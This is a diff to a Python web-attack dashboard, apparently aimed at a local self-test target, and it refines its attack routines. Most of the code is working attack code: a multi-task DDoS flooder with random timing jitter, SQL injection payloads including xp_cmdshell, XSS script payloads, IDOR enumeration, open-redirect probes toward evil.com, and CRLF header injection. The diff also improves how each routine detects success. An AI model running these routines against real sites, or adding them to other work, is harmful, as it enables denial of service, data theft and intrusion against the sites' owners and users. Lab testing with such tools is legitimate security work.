@@ -56,7 +56,11 @@ class AttackResponse(BaseModel):
     message: str
     attack_id: Optional[str] = None
 
-# Global metrics
+# Global metrics & synchronization lock
+metrics_lock = asyncio.Lock()
+MAX_TIME_SAMPLES = 1000
+MAX_VULN_ENTRIES = 500
+
 metrics = {
     "total_requests": 0,
     "successful_requests": 0,
@@ -65,10 +69,38 @@ metrics = {
     "attacks_running": False,
     "current_attacks": [],
     "response_times": [],
+    "request_history": [],
     "vulnerabilities_found": [],
     "attack_history": [],
     "system_status": "ready"
 }
+
+async def record_request_metric(success: bool, req_time: Optional[float] = None, status_code: Optional[int] = None):
+    async with metrics_lock:
+        metrics["total_requests"] += 1
+        if success:
+            metrics["successful_requests"] += 1
+        else:
+            metrics["failed_requests"] += 1
+        if req_time is not None:
+            metrics["response_times"].append(req_time)
+            if len(metrics["response_times"]) > MAX_TIME_SAMPLES:
+                del metrics["response_times"][:-MAX_TIME_SAMPLES]
+        if status_code is not None and req_time is not None:
+            metrics["request_history"].append({"time": time.time(), "status": status_code, "response_time": req_time})
+            if len(metrics["request_history"]) > MAX_TIME_SAMPLES:
+                del metrics["request_history"][:-MAX_TIME_SAMPLES]
+
+async def record_vulnerability(vuln: Dict[str, Any]) -> bool:
+    async with metrics_lock:
+        dedup_key = (vuln.get("type"), vuln.get("url"), vuln.get("payload"))
+        for existing in metrics["vulnerabilities_found"]:
+            if (existing.get("type"), existing.get("url"), existing.get("payload")) == dedup_key:
+                return False
+        metrics["vulnerabilities_found"].append(vuln)
+        if len(metrics["vulnerabilities_found"]) > MAX_VULN_ENTRIES:
+            del metrics["vulnerabilities_found"][:-MAX_VULN_ENTRIES]
+        return True
 
 # ── Hardcoded self-test target ─────────────────────────────────────────
 
@@ -90,17 +122,21 @@ class ConnectionManager:
         await websocket.send_text(message)
 
     async def broadcast(self, message: str):
-        for connection in self.active_connections:
+        dead = []
+        for connection in list(self.active_connections):
             try:
                 await connection.send_text(message)
-            except:
-                pass
+            except Exception:
+                dead.append(connection)
+        for d in dead:
+            self.disconnect(d)
 
 manager = ConnectionManager()
 
 # Attack functions
 async def ddos_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    async with aiohttp.ClientSession() as session:
+    timeout_cfg = aiohttp.ClientTimeout(total=2.5, sock_connect=1.5, sock_read=2.0)
+    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
         start_time = time.time()
         tasks = []
         
@@ -116,12 +152,9 @@ async def ddos_attack(url: str, duration: int, intensity: int, threads: int, att
                     }
                     
                     req_start = time.time()
-                    async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=2)) as response:
+                    async with session.get(url, headers=headers) as response:
                         req_time = time.time() - req_start
-                        metrics["total_requests"] += 1
-                        metrics["successful_requests"] += 1
-                        
-                        metrics["response_times"].append(req_time)
+                        await record_request_metric(True, req_time, response.status)
                         
                         await manager.broadcast(json.dumps({
                             "type": "metrics",
@@ -136,13 +169,11 @@ async def ddos_attack(url: str, duration: int, intensity: int, threads: int, att
                         }))
                         
                         sleep_delay = 1.0 / max(intensity, 1)
-                        if sleep_delay >= 0.05:
-                            await asyncio.sleep(sleep_delay)
-                        else:
-                            await asyncio.sleep(0.01)
+                        jitter = random.uniform(0.0, min(0.005, sleep_delay * 0.1))
+                        await asyncio.sleep(sleep_delay + jitter)
                 except Exception:
-                    metrics["failed_requests"] += 1
-                    await asyncio.sleep(0.02)
+                    await record_request_metric(False)
+                    await asyncio.sleep(0.02 + random.uniform(0.005, 0.03))
         
         for _ in range(threads):
             task = asyncio.create_task(send_request())
@@ -164,46 +195,74 @@ async def sql_injection_attack(url: str, duration: int, intensity: int, threads:
         "'; EXEC xp_cmdshell('dir'); --",
         "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--"
     ]
+    sql_error_signatures = [
+        "sql syntax", "mysql_fetch", "ora-0", "microsoft odbc",
+        "sqlite3.operationalerror", "unclosed quotation mark",
+        "unterminated quoted string", "pg_query()", "syntax error at or near"
+    ]
+    data_leak_signatures = [
+        "information_schema", "admin@testme.local", "password_hash",
+        "sqlite_master", "union select"
+    ]
     
-    async with aiohttp.ClientSession() as session:
+    timeout_cfg = aiohttp.ClientTimeout(total=5.0, sock_connect=2.0, sock_read=4.0)
+    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
         start_time = time.time()
+        base = url.rstrip('/')
+        baseline_text = ""
+        baseline_len = 0
+        try:
+            async with session.get(f"{base}/api/products?id=1") as base_resp:
+                baseline_text = (await base_resp.text()).lower()
+                baseline_len = len(baseline_text)
+        except Exception:
+            pass
+
         tasks = []
         
         async def send_payload():
             while time.time() - start_time < duration and metrics["attacks_running"]:
                 try:
                     payload = random.choice(payloads)
-                    base = url.rstrip('/')
                     test_url = f"{base}/api/products?id={payload}"
                     
                     req_start = time.time()
-                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
+                    async with session.get(test_url) as response:
                         req_time = time.time() - req_start
-                        metrics["total_requests"] += 1
-                        metrics["successful_requests"] += 1
-                        if True:
-                            text = await response.text()
-                            
-                            if any(error in text.lower() for error in ["sql syntax", "mysql_fetch", "ora-", "microsoft odbc", "sqlite"]):
-                                vuln = {
-                                    "type": "SQL Injection",
-                                    "url": test_url,
-                                    "payload": payload,
-                                    "timestamp": datetime.now().isoformat(),
-                                    "attack_id": attack_id
-                                }
-                                metrics["vulnerabilities_found"].append(vuln)
+                        text = await response.text()
+                        text_lower = text.lower()
+                        await record_request_metric(True, req_time, response.status)
+                        
+                        matched_err = next((err for err in sql_error_signatures if err in text_lower and err not in baseline_text), None)
+                        matched_leak = next((lk for lk in data_leak_signatures if lk in text_lower and lk not in baseline_text), None)
+                        boolean_bypass = (
+                            response.status == 200
+                            and ("1=1" in payload or "'1'='1" in payload)
+                            and baseline_len > 0
+                            and len(text_lower) > baseline_len * 1.35
+                        )
+                        
+                        if matched_err or matched_leak or boolean_bypass:
+                            evidence = matched_err or matched_leak or f"Response size expanded ({len(text_lower)}B vs {baseline_len}B baseline)"
+                            vuln = {
+                                "type": "SQL Injection",
+                                "url": test_url,
+                                "payload": payload,
+                                "evidence": evidence,
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            }
+                            if await record_vulnerability(vuln):
                                 await manager.broadcast(json.dumps({
                                     "type": "vulnerability",
                                     "data": vuln
                                 }))
                         
-                        
-                        metrics["response_times"].append(req_time)
-                        await asyncio.sleep(1.0 / intensity)
+                        sleep_delay = 1.0 / max(intensity, 1)
+                        await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.02))
                 except Exception:
-                    metrics["failed_requests"] += 1
-                    await asyncio.sleep(0.5)
+                    await record_request_metric(False)
+                    await asyncio.sleep(0.2 + random.uniform(0.05, 0.25))
         
         for _ in range(threads):
             task = asyncio.create_task(send_payload())
@@ -211,7 +270,18 @@ async def sql_injection_attack(url: str, duration: int, intensity: int, threads:
         
         await asyncio.gather(*tasks)
 
-async def xss_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_xss_payload: str = None):
+def _is_unescaped_xss_reflected(payload: str, body: str, content_type: str) -> bool:
+    """Verify the XSS payload is reflected unescaped in an executable HTML/DOM context."""
+    ctype = (content_type or "").lower()
+    if "application/json" in ctype or "text/plain" in ctype:
+        return False
+    if payload not in body:
+        return False
+    # Ensure angle brackets or event handlers are present unescaped (not HTML entity encoded)
+    active_Execution_tokens = ("<script", "onerror=", "onload=", "onfocus=", "<svg", "<iframe", "<img", "javascript:")
+    return any(tok in payload.lower() and tok in body.lower() for tok in active_Execution_tokens)
+
+async def xss_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_xss_payload: Optional[str] = None):
     payloads = [
         "<img src=x onerror=alert(1)>",
         "<script>alert('XSS')</script>",
@@ -228,13 +298,13 @@ async def xss_attack(url: str, duration: int, intensity: int, threads: int, atta
     ]
     if custom_xss_payload:
         p = custom_xss_payload
-        # If it's a simple text message, wrap it in a script alert
         if '<' not in p and '>' not in p:
             payloads.append(f"<script>alert('{p}')</script>")
         else:
             payloads.append(p)
             
-    async with aiohttp.ClientSession() as session:
+    timeout_cfg = aiohttp.ClientTimeout(total=5.0, sock_connect=2.0, sock_read=4.0)
+    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
         start_time = time.time()
         tasks = []
         
@@ -246,33 +316,31 @@ async def xss_attack(url: str, duration: int, intensity: int, threads: int, atta
                     test_url = f"{base}/search?q={payload}"
                     
                     req_start = time.time()
-                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
+                    async with session.get(test_url) as response:
                         req_time = time.time() - req_start
-                        metrics["total_requests"] += 1
-                        metrics["successful_requests"] += 1
-                        if True:
-                            text = await response.text()
-                            
-                            if payload in text:
-                                vuln = {
-                                    "type": "XSS",
-                                    "url": test_url,
-                                    "payload": payload,
-                                    "timestamp": datetime.now().isoformat(),
-                                    "attack_id": attack_id
-                                }
-                                metrics["vulnerabilities_found"].append(vuln)
+                        text = await response.text()
+                        content_type = response.headers.get("Content-Type", "text/html")
+                        await record_request_metric(True, req_time, response.status)
+                        
+                        if _is_unescaped_xss_reflected(payload, text, content_type):
+                            vuln = {
+                                "type": "XSS",
+                                "url": test_url,
+                                "payload": payload,
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            }
+                            if await record_vulnerability(vuln):
                                 await manager.broadcast(json.dumps({
                                     "type": "vulnerability",
                                     "data": vuln
                                 }))
                         
-                        
-                        metrics["response_times"].append(req_time)
-                        await asyncio.sleep(1.0 / intensity)
+                        sleep_delay = 1.0 / max(intensity, 1)
+                        await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.02))
                 except Exception:
-                    metrics["failed_requests"] += 1
-                    await asyncio.sleep(0.5)
+                    await record_request_metric(False)
+                    await asyncio.sleep(0.2 + random.uniform(0.05, 0.25))
         
         for _ in range(threads):
             task = asyncio.create_task(send_payload())
@@ -683,7 +751,6 @@ async def xxe_attack(url: str, duration: int, intensity: int, threads: int, atta
 async def idor_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
     """Increment numeric IDs in query params to test for IDOR."""
     start_time = time.time()
-    id_params = ['id', 'user_id', 'account', 'order', 'invoice', 'file', 'doc', 'ticket', 'profile']
     async with aiohttp.ClientSession() as session:
         for base_id in range(1, 200):
             if time.time() - start_time >= duration or not metrics['attacks_running']:
@@ -695,15 +762,15 @@ async def idor_attack(url: str, duration: int, intensity: int, threads: int, att
             try:
                 async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                     elapsed = time.time() - t0
-                    metrics['total_requests'] += 1
                     if resp.status == 200:
-                        metrics['successful_requests'] += 1
-                        await manager.broadcast(json.dumps({'type':'log','message':f'[IDOR] 200 OK → {param}={base_id} — check manually for data leak','level':'warning'}))
+                        await record_request_metric(True, elapsed, resp.status)
+                        await manager.broadcast(json.dumps({'type':'log','message':f'[IDOR] 200 OK → /api/users/{base_id} — check manually for data leak','level':'warning'}))
                     elif resp.status in [401, 403]:
-                        metrics['failed_requests'] += 1
-                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
+                        await record_request_metric(False, elapsed, resp.status)
+                    else:
+                        await record_request_metric(True, elapsed, resp.status)
             except Exception:
-                metrics['failed_requests'] += 1
+                await record_request_metric(False)
             await asyncio.sleep(1.0 / max(intensity, 1))
 
 
@@ -725,18 +792,15 @@ async def open_redirect_attack(url: str, duration: int, intensity: int, threads:
             try:
                 async with session.get(test_url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                     elapsed = time.time() - t0
-                    metrics['total_requests'] += 1
+                    await record_request_metric(True, elapsed, resp.status)
                     location = resp.headers.get('Location', '')
                     if resp.status in [301,302,303,307,308] and 'evil.com' in location:
-                        metrics['successful_requests'] += 1
                         vuln = {'type': 'Open Redirect', 'url': test_url, 'payload': payload, 'severity': 'Medium', 'evidence': f'Location: {location}'}
-                        metrics['vulnerabilities_found'].append(vuln)
-                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
-                        await manager.broadcast(json.dumps({'type':'log','message':f'[Redirect] VULNERABLE → redirects to {location}','level':'error'}))
-                    
-                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
+                        if await record_vulnerability(vuln):
+                            await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
+                            await manager.broadcast(json.dumps({'type':'log','message':f'[Redirect] VULNERABLE → redirects to {location}','level':'error'}))
             except Exception:
-                metrics['failed_requests'] += 1
+                await record_request_metric(False)
             await asyncio.sleep(1.0 / max(intensity, 1))
 
 
@@ -752,7 +816,6 @@ async def header_injection_attack(url: str, duration: int, intensity: int, threa
     ]
     if custom_payload:
         import urllib.parse
-        # URL encode custom payload to prevent URL splitting errors, ensure CRLF is prepended correctly
         clean_custom = custom_payload.replace('\r\n', '\n').replace('\r', '\n')
         for line in clean_custom.split('\n'):
             if line.strip():
@@ -769,16 +832,14 @@ async def header_injection_attack(url: str, duration: int, intensity: int, threa
             try:
                 async with session.get(test_url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                     elapsed = time.time() - t0
-                    metrics['total_requests'] += 1
+                    await record_request_metric(True, elapsed, resp.status)
                     resp_headers_str = str(dict(resp.headers))
                     if 'injected' in resp_headers_str or 'hacked' in resp_headers_str:
-                        metrics['successful_requests'] += 1
                         vuln = {'type': 'HTTP Header Injection / CRLF', 'url': test_url, 'payload': payload, 'severity': 'High', 'evidence': resp_headers_str[:200]}
-                        metrics['vulnerabilities_found'].append(vuln)
-                        await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
-                        metrics['request_history'].append({'time': time.time(), 'status': resp.status, 'response_time': elapsed})
+                        if await record_vulnerability(vuln):
+                            await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
             except Exception:
-                metrics['failed_requests'] += 1
+                await record_request_metric(False)
             await asyncio.sleep(1.0 / max(intensity, 1))
 
 
@@ -788,8 +849,8 @@ async def header_injection_attack(url: str, duration: int, intensity: int, threa
 
 async def _broadcast_finding(vuln: dict):
     """Store finding and broadcast to all connected clients."""
-    metrics["vulnerabilities_found"].append(vuln)
-    await manager.broadcast(json.dumps({"type": "vulnerability", "data": vuln}))
+    if await record_vulnerability(vuln):
+        await manager.broadcast(json.dumps({"type": "vulnerability", "data": vuln}))
 
 
 def format_url(target: str) -> str:
@@ -1341,7 +1402,10 @@ async def run_attack_coordinator(req: AttackRequest, attack_id: str):
             "successful_requests": metrics["successful_requests"],
             "timestamp": datetime.now().isoformat()
         }
-        metrics["attack_history"].append(history_item)
+        async with metrics_lock:
+            metrics["attack_history"].append(history_item)
+            if len(metrics["attack_history"]) > 200:
+                del metrics["attack_history"][:-200]
         
         await manager.broadcast(json.dumps({
             "type": "attack_status",
@@ -1407,12 +1471,14 @@ async def stop_attack():
 
 @app.post("/api/logs/clear")
 async def clear_logs():
-    metrics["total_requests"] = 0
-    metrics["successful_requests"] = 0
-    metrics["failed_requests"] = 0
-    metrics["response_times"] = []
-    metrics["vulnerabilities_found"] = []
-    metrics["attack_history"] = []
+    async with metrics_lock:
+        metrics["total_requests"] = 0
+        metrics["successful_requests"] = 0
+        metrics["failed_requests"] = 0
+        metrics["response_times"] = []
+        metrics["request_history"] = []
+        metrics["vulnerabilities_found"] = []
+        metrics["attack_history"] = []
     
     await manager.broadcast(json.dumps({
         "type": "log",
